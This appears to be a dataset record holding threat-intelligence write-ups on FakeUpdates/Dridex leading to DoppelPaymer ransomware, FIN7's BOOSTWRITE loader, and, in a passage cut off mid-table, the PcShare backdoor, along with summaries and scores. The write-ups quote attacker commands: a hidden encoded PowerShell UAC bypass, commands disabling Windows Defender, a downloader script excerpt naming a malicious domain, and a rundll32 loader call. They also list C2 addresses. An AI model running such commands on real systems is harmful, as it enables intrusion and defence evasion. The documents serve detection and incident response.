hours after initial Dridex download. The pace of the initial phases of related attacks possibly suggests that automated post-compromise techniques are used in part before interactive operator activity occurs.We identified extensive usage of Empire and C2 communication to various servers during these investigations. For example, via process tracking, we identified a Dridex-injected explorer.exe executing malicious PowerShell: a clear sign of an Empire stager:Figure 12: An example of PowerShell Empire stager execution revealed during forensic analysisIn the above example, the threat actors instructed the victim system to use the remote server 185.122.59[.]78 for command-and-control using an out-of-the-box Empire agent C2 configuration for TLS-encrypted backdoor communications.During their hands-on post-exploitation activity, the threat actors also moved laterally via PowerShell remoting and RDP sessions. FireEye identified the use of WMI to create remote PowerShell processes, subsequently used to execute Empire stagers on domain-joined systems. In one specific case, the time delta between initial Empire backdoor and successful lateral movement was under 15 minutes. Another primary goal for the threat actor was internal reconnaissance of both the local system and domain the computer was joined to. Figure 13 provides a snippet of Active Directory reconnaissance commands issued by the attacker during one of our investigations.Figure 13: Attacker executed commandsThe threat actors used an Empire module named SessionGopher and the venerable Mimikatz to harvest endpoint session and credential information. Finally, we also identified the attackers utilized Empire's Invoke-EventVwrBypass, a Windows bypass technique used to launch executables using eventvwr.exe, as shown in Figure 14.""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update), powershell -NoP -NonI -W Hidden -enc $xFigure 14: PowerShell event viewer bypassRansomware Attacks & Operator TacticsWithin these investigations, FireEye identified the deployment BitPaymer or DoppelPaymer ransomware. While these ransomware variants are highly similar, DoppelPaymer uses additional obfuscation techniques. It also has enhanced capabilities, including an updated network discovery mechanism and the requirement of specific command-line execution. DoppelPaymer also uses a different encryption and padding scheme.The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware.Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Within days, this secondary Dridex instance was then used to enable the distribution of DoppelPaymer ransomware. Prior to DoppelPaymer, the threat actor deleted volume shadow copies and disabled anti-virus and anti-malware protections on select systems. Event log artifacts revealed commands executed through PowerShell which were used to achieve this step (Figure 15):Event Log EID Message Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Uninstall-WindowsFeature -Name Windows-Defender Application 1034 Windows Installer removed the product. Product Name: McAfee Agent-++-5.06.0011-++-1033-++-1603-++-McAfee, Inc.-++-(NULL)-++--++-. Product Version: 82.Figure 15: Event log entries related to the uninstallation of AV agents and disablement of real-time monitoringThe DoppelPaymer ransomware was found in an Alternate Data Stream (ADS) in randomly named files on disk. ADSs are attributes within NTFS that allow for a file to have multiple data streams, with only the primary being visible in tools such as Windows Explorer. After ransomware execution, files are indicated as encrypted by being renamed with a "".locked"" file extension. In addition to each "".locked"" file, there is a ransom note with the file name ""readme2unlock.txt"" which provides instructions on how to decrypt files.Figure 16: DoppelPaymer ransomware note observed observed during a Mandiant Incident Response investigationRansomware? Not In My House!Over the past few years, we have seen ransomware graduate from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets - some automated, some manual - with the ultimate goal of holding the victim organization hostage.Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don't need to get access to the most sensitive parts of your organization - they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. Mandiant recently published an in depth white paper on Ransomware Protection and Containment Strategies, which may help organizations mitigate the risk of ransomware events.IndicatorsThe following indicator set is a collective representation of artifacts identified during investigations into multiple customer compromises.Type Indicator(s) FakeUpdates Files 0e470395b2de61f6d975c92dea899b4f 7503da20d1f83ec2ef2382ac13e238a8 102ae3b46ddcb3d1d947d4f56c9bf88c aaca5e8e163503ff5fadb764433f8abb 2c444002be9847e38ec0da861f3a702b 62eaef72d9492a8c8d6112f250c7c4f2 175dcf0bd1674478fb7d82887a37317410eefc485a42fac3b928f960a98dc451a2ac7b9c0a049ceecc1f17022f16fdc6 FakeUpdates Domains & IP Addresses <8-Characters>.green.mattingsolutions[.]co<8-Characters>.www2.haciendarealhoa[.]com<8-Characters>.user3.altcoinfan[.]com93.95.100[.]178130.0.233[.]178185.243.115[.]84 gnf6.ruscacademy[.]in backup.awarfaregaming[.]com click.clickanalytics208[.]com track.amishbrand[.]com track.positiverefreshment[.]org link.easycounter210[.]com nircmdc.exe 8136d84d47cb62b4a4fe1f48eb64166e Dridex 7239da273d3a3bfd8d169119670bb745 72fe19810a9089cd1ec3ac5ddda22d3f07b0ce2dd0370392eedb0fc161c99dc7c8bb08283e55aed151417a9ad1bc7ad9 6e05e84c7a993880409d7a0324c10e74 63d4834f453ffd63336f0851a9d4c632 0ef5c94779cd7861b5e872cd5e922311 Empire C2 185.122.59[.]78 109.94.110[.]136Detecting the TechniquesFireEye detects this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer Ransomware. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances. This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring.Platform Signature Name Endpoint Security HX Exploit DetectionEmpire RAT (BACKDOOR)EVENTVWR PARENT PROCESS (METHODOLOGY)Dridex (BACKDOOR)Dridex A (BACKDOOR)POWERSHELL SSL VERIFICATION DISABLE (METHODOLOGY)SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)FAKEUPDATES SCREENSHOT CAPTURE (METHODOLOGY) Network Security Backdoor.FAKEUPDATESTrojan.Downloader.FakeUpdateExploit.Kit.FakeUpdateTrojan.SSLCert.SocGholishMITRE ATT&CK Technique MappingATT&CK Techniques Initial Access Drive-by Compromise (T1189), Exploit Public-Facing Application (T1190) Execution PowerShell (T1086), Scripting (T1064), User Execution (T1204), Windows Management Instrumentation (T1047) Persistence DLL Search Order Hijacking (T1038) Privilege Escalation Bypass User Account Control (T1088), DLL Search Order Hijacking (T1038) Defense Evasion Bypass User Account Control (T1088), Disabling Security Tools (T1089), DLL Search Order Hijacking (T1038), File Deletion (T1107), Masquerading (T1036), NTFS File Attributes (T1096), Obfuscated Files or Information (T1027), Scripting (T1064), Virtualization/Sandbox Evasion (T1497) Credential Access Credential Dumping (T1003) Discovery Account Discovery (T1087), Domain Trust Discovery (T1482), File and Directory Discovery (T1083), Network Share Discovery (T1135), Process Discovery (T1057), Remote System Discovery (T1018), Security Software Discovery (T1063), System Information Discovery (T1082), System Network Configuration Discovery (T1016), Virtualization/Sandbox Evasion (T1497) Lateral Movement Remote Desktop Protocol (T1076), Remote File Copy (T1105) Collection Data from Local System (T1005), Screen Capture (T1113) Command And Control Commonly Used Port (T1436), Custom Command and Control Protocol (T1094) ,Data Encoding (T1132), Data Obfuscation (T1001), Remote Access Tools (T1219), Remote File Copy (T1105), Standard Application Layer Protocol (T1071) Exfiltration Automated Exfiltration (T1020), Exfiltration Over Command and Control Channel (T1041) Impact Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490), Service Stop (T1489)AcknowledgementsA huge thanks to James Wyke and Jeremy Kennelly for their analysis of this activity and support of this post.Catch an on-demand recap on this and the Top 5 Managed Defense attacks this year.";"FireEye has observed that the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport, and multiple postexploitation frameworks. The threat actors' ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and postincident triage attempts on the compromise site(s).Figure 2: Example of FakeUpdate landing page after HTTP redirectsThe redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages.After clicking the 'Update' button, we observed the downloading of one of three types of files:Heavilyobfuscated HTML applications (.hta file extensions)JavaScript files (.js file extensions)ZIPcompressed JavaScript files (.zip extensions)Figure 3 provides a snippet of JavaScript that provides the initial download functionality.var domain = '//gnf6.ruscacademy[. ]in/';var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206';var statTypeParamName = 'st'; ... var filename = 'download.hta';var browser = 'Chrome';var special = '1';var filePlain = window.atob(file64);var a = document.getElementById('buttonDownload');Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pagesWhen the user opens the initial FakeUpdates downloader, the Windows Scripting Host (wscript.exe) is executed and the following actions are performed:A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third FireEye has observed the threat actors leveraging their Dridex backdoor(s) to execute the publiclyavailable PowerShell Empire and/or Koadic postexploitation frameworks. Managed Defense has also observed the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. FireEye has identified the deployment of BitPaymer or DoppelPaymer ransomware. The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware. Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Ransomware has evolved from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets some automated, some manual with the ultimate goal of holding the victim organization hostage. Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don't need to get access to the most sensitive parts of your organization they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. FireEye has detected this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances.";en;{'r': 0.25821972734562953, 'p': 0.9526627218934911, 'f': 0.40630914490950465};{'r': 0.2071307300509338, 'p': 0.9087523277467412, 'f': 0.3373660529739246};{'r': 0.25821972734562953, 'p': 0.9526627218934911, 'f': 0.40630914490950465}
https://www.mandiant.com/resources/blog/mahalo-fin7-responding-to-new-tools-and-techniques;Mahalo FIN7: Responding to the Criminal Operators’ New Tools and Techniques;"During several recent incident response engagements, FireEye Mandiant investigators uncovered new tools in FIN7's malware arsenal and kept pace as the global criminal operators attempted new evasion techniques. In this blog, we reveal two of FIN7's new tools that we have called BOOSTWRITE and RDFSNIFFER.The first of FIN7's new tools is BOOSTWRITE - an in-memory-only dropper that decrypts embedded payloads using an encryption key retrieved from a remote server at runtime. FIN7 has been observed making small changes to this malware family using multiple methods to avoid traditional antivirus detection, including a BOOSTWRITE sample where the dropper was signed by a valid Certificate Authority. One of the analyzed BOOSTWRITE variants contained two payloads: CARBANAK and RDFSNIFFER. While CARBANAK has been thoroughly analyzed and has been used maliciously by several financial attackers including FIN7, RDFSNIFFER is a newly-identified tool recovered by Mandiant investigators.RDFSNIFFER, a payload of BOOSTWRITE, appears to have been developed to tamper with NCR Corporation's ""Aloha Command Center"" client. NCR Aloha Command Center is a remote administration toolset designed to manage and troubleshoot systems within payment card processing sectors running the Command Center Agent. The malware loads into the same process as the Command Center process by abusing the DLL load order of the legitimate Aloha utility. Mandiant provided this information to NCR.BOOSTWRITE Loader: Where You At?BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate 'Dwrite.dll' provided by the Microsoft DirectX Typography Services. The application loads the 'gdi' library, which loads the 'gdiplus' library, which ultimately loads 'Dwrite'. Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs. To accomplish this task, the malware first generates a random file name to be used as a text log under the current user's %TEMP% directory, this filename starts with ~rdf and is followed by a set of random numbers. Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body. Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads. The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV.Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results. The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the filesystem.The malware logs various plaintext messages to the previously created logfile %TEMP%\~rds<rnd_numbers> which are indicative of the loader's execution progress. An example of the file content is shown in Figure 1:Loading...Starting...Init OKKey OKData: 4606941HS: 20K:[32] V:[8]DCnt: 732642317(ERR)Figure 1: BOOSTWRITE log fileBefore exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.The malware decrypts and loads two payload DLLs. One of the DLLs is an instance of the CARBANAK backdoor, the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an attacker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions.RDFSNIFFER Module: We Smell a RATRDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation's 'Aloha Command Center Client' (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs. RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility's DLL load order, launching each time the 'Aloha Command Center Client' is executed on an impacted system.When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1). Furthermore, this enables the malware to alter the user's last input time to ensure application sessions do not time out.Win32 API Function Hook Description CertVerifyCertificateChainPolicy Used to man-in-the-middle SSL sessions CertGetCertificateChain Used to man-in-the-middle SSL sessions WSAConnect Used to man-in-the-middle socket connections connect Used to man-in-the-middle socket connections ConnectEx Used to man-in-the-middle socket connections DispatchMessageW Used to hijack the utility's UI DispatchMessageA Used to hijack the utility's UI DefWindowProcW Used to hijack the utility's UI DefWindowProcA Used to hijack the utility's UI GetLastInputInfo Used to change the user's last input time (to avoid timed lock outs)Table 1: RDFSNIFFER's Hooked Win32 API FunctionsThis module also contains a backdoor component that enables it to inject commands into an active RDFClient session. This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).Command Name Legit Function in RDFClient RDFClient Command ID Description Upload FileMgrSendFile 107 Uploads a file to the remote system Download FileMgrGetFile 108 Retrieves a file from the remote system Execute RunCommand 3001 Executes a command on the remote system DeleteRemote FileMgrDeleteFile 3019 Deletes file on remote system DeleteLocal - - Deletes a local fileTable 2: RDFSNIFFER's Backdoor FunctionsSigned: Yours Truly, FIN7While the majority of BOOSTWRITE variants recovered from investigations have been unsigned, Mandiant identified a signed BOOSTWRITE sample used by FIN7 during a recent investigation. Following that discovery, a signed BOOSTWRITE sample was uploaded to VirusTotal on October 3. This executable uses a code signing certificate issued by MANGO ENTERPRISE LIMITED (Table 3).MD5 Organization Country Serial a67d6e87283c34459b4660f19747a306 mango ENTERPRISE LIMITED GB 32 7F 8F 10 74 78 42 4A BE B8 2A 85 DC 36 57 03 CC 82 70 5BTable 3: Code signing certificate used for BOOSTWRITEThis indicates the operators may be actively altering this malware to avoid traditional detection mechanisms. Notably, the signed BOOSTWRITE sample had a 0/68 detection ratio when it was uploaded to VirusTotal, demonstrating the effectiveness of this tactic (Figure 2).Figure 2: Current VirusTotal detection ratio for signed BOOSTWRITEUse of a code signing certificate for BOOSTWRITE is not a completely new technique for FIN7 as the group has used digital certificates in the past to sign their phishing documents, backdoors, and later stage tools. By exploiting the trust inherently provided by code certificates, FIN7 increases their chances of bypassing various security controls and successfully compromising victims. The full evasion achieved against the detection engines deployed to VirusTotal - as compared to an unsigned BOOSTWRITE sample with an invalid checksum- illustrates that FIN7's methods were effective in subverting both traditional detection and ML binary classification engines. This is a known issue and has been deeply studied since at least 2016's ""Chains of Distrust"" research and 2017's ""Certified Malware"" paper. Since there are plenty of goodware samples with bad or no signatures - and a growing number of malware samples with good signatures - there is no easy solution here. The upside is that vendors selectively deploy engines to VirusTotal (including FireEye) and VT detection performance often isn't a comprehensive representation of encountering full security technology stacks that implement detection-in-depth. Later in this blog we further explore BOOSTWRITE's PE Authenticode signature, its anomalies, and how code signing can be turned from a detection challenge into detection opportunities.Outlook and ImplicationsWhile these incidents have also included FIN7's typical and long-used toolsets, such as CARBANAK and BABYMETAL, the introduction of new tools and techniques provides further evidence FIN7 is continuing to evolve in response to security enhancements. Further, the use of code signing in at least one case highlights the group's judicious use of resources, potentially limiting their use of these certificates to cases where they have been attempting to bypass particular security controls. Barring any further law enforcement actions, we expect at least a portion of the actors who comprise the FIN7 criminal organization to continue conducting campaigns. As a result, organizations need to remain vigilant and continue to monitor for changes in methods employed by the FIN7 actors.Sigs Up Dudes! Indicators, Toolmarks, and Detection OpportunitiesWhile FireEye does not release our production detection logic for the code families, this section does contain some identification and hunting concepts that we adopt in our layered detection strategy. Table 4 contains malware samples referenced in this blog that FireEye is able to share from the larger set recovered during active investigations.Type Indicator(s) BOOSTWRITE (signed) MD5: a67d6e87283c34459b4660f19747a306SHA-1: a873f3417d54220e978d0ca9ceb63cf13ec71f84SHA-256: 18cc54e2fbdad5a317b6aeb2e7db3973cc5ffb01bbf810869d79e9cb3bf02bd5 C2: 109.230.199[.]227 BOOSTWRITE (unsigned) MD5: af2f4142463f42548b8650a3adf5ceb2SHA1: 09f3c9ae382fbd29fb47ecdfeb3bb149d7e961a1SHA256: 8773aeb53d9034dc8de339651e61d8d6ae0a895c4c89b670d501db8dc60cd2d0 C2: 109.230.199[.]227Table 4: Publicly-shareable BOOSTWRITE samplesThe signed BOOSTWRITE sample has a PE Authenticode anomaly that can be detected using yara's PE signature module. Specifically, the PE linker timestamp is prior to the Authenticode validity period, as seen in Table 5.Timestamp Description 2019-05-20 09:50:55 UTC Signed BOOSTWRITE's PE compilation time 2019-05-22 00:00 UTCthrough2020-05-21 23:59 UTC Signed BOOSTWRITE's ""mango ENTERPRISE LIMITED"" certificate validity windowTable 5: Relevant executabe timestampsA public example of a Yara rule covering this particular PE Authenticode timestamp anomaly is available in a blog post from David Cannings, with the key logic shown in Figure 3.pe.number_of_signatures > 0 and not for all i in (0..pe.number_of_signatures - 1):pe.signatures[i].valid_on(pe.timestamp)Figure 3: Excerpt of NCC Group's research Yara ruleThere are other PE Authenticode anomalies that can also be represented as Yara rules to surface similarly suspicious files. Of note, this signed BOOSTWRITE sample has no counter signature and, while the unauthenticated attributes timestamp structure is present, it is empty. In preparing this blog, FireEye's Advanced Practices team identified a possible issue with VirusTotal's parsing of signed executable timestamps as seen in Figure 4.Figure 4: Inconsistency in VirusTotal file signature timestamps for the signed BOOSTWRITE sampleFireEye filed a bug report with Google to address the discrepancy in VirusTotal in order to remove confusion for other users.To account for the detection weaknesses introduced by techniques like code signing, our Advanced Practices team combines the malicious confidence spectrum that comes from ML detection systems with file oddities and anomalies (weak signals) to surface highly interesting and evasive malware. This technique was recently described in our own Dr. Steven Miller's Definitive Dossier of Devilish Debug Details. In fact, the exact same program database (PDB) path-based approach from his blog can be applied to the toolmarks seen in this sample for a quick hunting rule. Figure 5 provides the PDB path of the BOOSTWRITE samples from this blog.F:\projects\DWriteImpl\Release\DWriteImpl.pdbFigure 5: BOOSTWRITE PDB pathThe Yara rule template can be applied to result in the quick rule in Figure 6.rule ConventionEngine_BOOSTWRITE{meta:author = ""Nick Carr (@itsreallynick)""reference = ""https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html""strings:$weetPDB = /RSDS[\x00-\xFF]{20}[a-zA-Z]?:?\\[\\\s|*\s]?.{0,250}\\DWriteImpl[\\\s|*\s]?.{0,250}\.pdb\x00/ nocasecondition:(uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $weetPDB and filesize < 6MB}Figure 6: Applying BOOSTWRITE's PDB path to a Yara ruleWe can apply this same concept across other executable traits, such as BOOSTWRITE's export DLL name (DWriteImpl.dll), to create quick and easy rules that can aid in quick discovery as seen in Figure 7.rule Exports_BOOSTWRITE{meta:author = ""Steve Miller (@stvemillertime) & Nick Carr (@itsreallynick)""strings:$exyPants = ""DWriteImpl.dll"" nocasecondition:uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $exyPants at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12)) and filesize < 6MB}Figure 7: Applying BOOSTWRITE's export DLL names to a Yara rule (Note: this rule was updated following publication. It previously read ""module_ls.dll"", which is for Turla and unrelated.)Of course, resilient prevention capabilities are needed and to that end, FireEye detects this activity across our platforms. Table 6 contains several specific detection names from a larger list of detection capabilities that captured this activity natively.Platform Signature Name Endpoint Security MalwareGuard ML detection (unsigned variants) Network Security and Email Security Malware.binary.dll (dynamic detection)MalwareGuard ML detection (unsigned variants)APTFIN.Dropper.Win.BOOSTWRITE (network traffic)APTFIN.Backdoor.Win.RDFSNIFFER (network traffic)FE_APTFIN_Dropper_Win_BOOSTWRITE (static code family detection)FE_APTFIN_Backdoor_Win_RDFSNIFFER (static code family detection)Table 6: FireEye detection matrixDon't Sweat the Techniques - MITRE ATT&CK MappingsBOOSTWRITEID Tactic BOOSTWRITE Context T1022 Data Encrypted BOOSTWRITE encodes its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit IV to evade detection T1027 Obfuscated Files or Information BOOSTWRITE encodes its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit IV to evade detection T1038 DLL Search Order Hijacking BOOSTWRITE exploits the applications' loading of the 'gdi' library, which loads the 'gdiplus' library, which ultimately loads the local 'Dwrite' dll T1116 Code Signing BOOSTWRITE variants were observed signed by a valid CA T1129 Execution through Module Load BOOSTWRITE exploits the applications' loading of the 'gdi' library, which loads the 'gdiplus' library, which ultimately loads the local 'Dwrite' dll T1140 Deobfuscate/Decode Files or Information BOOSTWRITE decodes its payloads at runtime using using a ChaCha stream cipher with a 256-bit key and 64-bit IVRDFSNIFFERID Tactic RDFSNIFFER Context T1106 Execution through API RDFSNIFFER hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface T1107 File Deletion RDFSNIFFER has the capability of deleting local files T1179 Hooking RDFSNIFFER hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interfaceAcknowledgementsThe authors want to thank Steve Elovitz, Jeremy Koppen, and the many Mandiant incident responders that go toe-to-toe with FIN7 regularly, quietly evicting them from victim environments. We appreciate the thorough detection engineering from Ayako Matsuda and the reverse engineering from FLARE's Dimiter Andonov, Christopher Gardner and Tyler Dean. A special thanks to FLARE's Troy Ross for the development of his PE Signature analysis service and for answering our follow-up questions. Shout out to Steve Miller for his hot fire research and Yara anomaly work. And lastly, the rest of the Advanced Practices team for both the unparalleled front-line FIN7 technical intelligence expertise and MITRE ATT&CK automated mapping project - with a particular thanks to Regina Elwell and Barry Vengerik.";FireEye's Advanced Practices team combines the malicious confidence spectrum that comes from ML detection systems with file oddities and anomalies (weak signals) to surface highly interesting and evasive malware. This technique was recently described in our own Dr. Steven Miller's Definitive Dossier of Devilish Debug Details. In fact, the exact same program database (PDB) pathbased approach from his blog can be applied to the toolmarks seen in this sample for a quick hunting rule. FireEye has detected this activity across our platforms. Table 6 contains several specific detection names from a larger list of detection capabilities that captured this activity natively.Platform Signature Name Endpoint Security MalwareGuard ML detection (unsigned variants)Network Security and Email Security Malware.binary.dll (dynamic detection)MalwareGuard ML detection (unsigned variants)APTFIN.Dropper.Win.BOOSTWRITE (network traffic)APTFIN.Backdoor.Win.RDFSNIFFER (network traffic)FE_APTFIN_Dropper_Win_BOOSTWRITE (static code family detection)FE_APTFIN_Backdoor_Win_RDFSNIFFER (static code family detection);en;{'r': 0.10679611650485436, 'p': 0.9734513274336283, 'f': 0.19247593872566018};{'r': 0.06569343065693431, 'p': 0.9333333333333333, 'f': 0.12274719799198494};{'r': 0.10679611650485436, 'p': 0.9734513274336283, 'f': 0.19247593872566018}
https://blogs.blackberry.com/en/2019/09/pcshare-backdoor-attacks-targeting-windows-users-with-fakenarrator-malware;PcShare Backdoor Attacks Targeting Windows Users with FakeNarrator Malware;"IntroductionOver the course of the last two years, BlackBerry Cylance researchers uncovered a suspected Chinese advanced persistent threat (APT) group conducting attacks against technology companies located in south-east Asia.The threat actors deployed a version of the open-source PcShare backdoor modified and designed to operate when side-loaded by a legitimate NVIDIA application.The attackers also deploy a Trojanized screen reader application, replacing the built-in Narrator ""Ease of Access"" feature in Windows. This backdoor allows them to surreptitiously control systems via remote desktop logon screens without the need for credentials.This report outlines the public-domain malware samples related to this threat actor. It includes insight into the malicious use of Narrator.exe and modifications to the PcShare backdoor.Our research will benefit security-minded professionals by detailing the evolving tactics, techniques, and procedures (TTPs) of a capable threat actor. For CISOs, familiarizing yourself with how the threat landscape is changing will better position you to protect your organization.AnalysisThe attackers use a modified version of a Chinese open-source backdoor called PcShare as their main foothold on the victim's machine. The backdoor is specifically tailored to the needs of the campaign, with additional command-and- control (C&C) encryption and proxy bypass functionality, and any unused functionality removed from the code. It arrives with a bespoke loader utilizing DLL sideloading technique.After gaining access to the victim's machine, the attackers deploy a range of post-exploitation tools, many of them based on publicly available code often found on Chinese programming portals. One of these tools stood out, a bespoke Trojan that abuses Microsoft Accessibility Features to gain SYSTEM-level access on the compromised machine in a way similar to the infamous ""Sticky Keys"" attack. In this case, instead of replacing the usual sethc.exe or utilman.exe binaries, the attackers chose to Trojanize the Narrator executable - a Windows utility that reads aloud the text on the screen and can be invoked on the login screen with a keyboard shortcut. The use of Fake Narrator to gain SYSTEM-level access to the victim's machine suggests the attackers are interested in maintaining a long-term foothold.The campaign is characterized by a fair level of stealthiness as the threat actor made a concerted effort to avoid detection. The use of DLL side-loading technique together with a bespoke loader utilizing memory injection ensures that the main backdoor binary is never dropped to the disk. A simple but effective anti-sandboxing technique of payload encoding based on execution path is also implemented to avoid detection. The C&C infrastructure is protected by a level of indirection. The configuration supplied by the loader is passed as plain text, but the URL it contains is not the real C&C address. It instead points to a remote file that provides the actual details to be used in the C&C communication. This allows the attackers to easily change the preferred C&C address, decide the timing of the communication, and - by applying server-side filtering - restrict revealing the real address to requests coming from specific regions or at specific times.As of today, precise attribution of these attacks has proven elusive. The use of PcShare backdoor, as well as the geographical location of the victims, bear similarities to a known threat actor called Tropic Trooper, which is actively targeting government institutions and heavy industry companies in Taiwan and Philippines.PcShare loaderSHA256 c5226bfd53d789a895559e8bcbedc4ecdde543e54a427b1cb4e5d7ef90756daa CLASSIFICATION Malware/Backdoor SIZE 424 KB (434,176 bytes) TYPE PE32 executable (DLL) (GUI) Intel 80386, for MS Windows FILENAME NvSmartMax.dll TIMESTAMP 2017-10-20 07:08:10SHA256 1899B3D59A9DC693D45410965C40C464224160BBEF596F51D35FDA099D609744 CLASSIFICATION Malware/Backdoor SIZE 424 KB (434,176 bytes) TYPE PE32 executable (DLL) (GUI) Intel 80386, for MS Windows FILENAME NvSmartMax.dll TIMESTAMP 2017-09-28 09:01:58OverviewThe DLL is side-loaded[1] by the legitimate ""NVIDIA Smart Maximise Helper Host"" application (part of NVIDIA GPU graphics driver) instead of the original NvSmartMax.dll that the program normally uses. Its main responsibility is to decrypt and load the encoded payload stored either in its .data section, or in a separate DAT file:Figure 1: Loader overviewThe threat actor has been observed using the same PcShare payload across attacks on multiple organizations. However, the side-loaded DLL is often modified per target (seemingly without recompiling) to update configuration details such as C&C IP addresses and victim identifiers.FEATURESDLL sideloading using a choice of files tailored to the victim's environmentEmbedded plain text configurationSimple anti-sandboxing measurePayload encoded with one-byte XORPayload injected to memory without being dropped to the diskBEHAVIORWhile the DllMain function of the PcShare loader is empty, the library exports three other functions. An export called NvSmartMaxUseDynamicDeviceGrids contains the routine that will decrypt and execute the payload, while another one, NvSmartMaxNotifyAppHWND, is responsible for invoking the decryption routine in the context of a separate process. The third exported function, (GetContainingRect), is irrelevant to the malicious activity but required by the legitimate application.Once the malicious NvSmartMaxNotifyAppHWND export is called, it will:Create a mutex with a hardcoded GUID-like nameRename the original legitimate EXE file by appending the suffix ""Ex"" prior to the extensionSet persistence in the registry by adding an ""NvSmart"" entry (with the path pointing to the copy of legitimate file) to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run keyThe decoding routine is then invoked in the context of a separate rundll32.exe process by calling the CreateProcess API with the following parameters:rundll32.exe %s ,NvSmartMaxUseDynamicDeviceGridsFigure 2: rundll32.exe used to launch the decryption routineTo ensure just one instance of the payload injection routine is running, the NvSmartMaxUseDynamicDeviceGrids function will create another GUID-like mutex before proceeding to decrypt and execute the payload.Decoding is XOR based, and the initial one-byte XOR key is computed based on the current process path. Such anti-analysis measures can prevent the payload from being decoded properly when running in some sandboxed environments, as it will only generate the correct XOR key when its parent process name is rundll32.exe:Figure 3: Key calculation (based on executable path) and payload decryptionThe XOR decoding routine can be translated into C/C++ code as follows:Figure 4: Pseudo-code for payload decryptionAfter decoding the payload, the malware will reflectively load it into memory of rundll32.exe and execute, passing a pointer to the hardcoded configuration as a parameter:Figure 5: Hard-coded configurationCONFIGURATIONField Value Victim GUID (?) ?84314963-BE0E-43C9-A0BE-83B180361999 ServerPort 443 Timeout 0x3C (60.) Cmd - ServerAddr 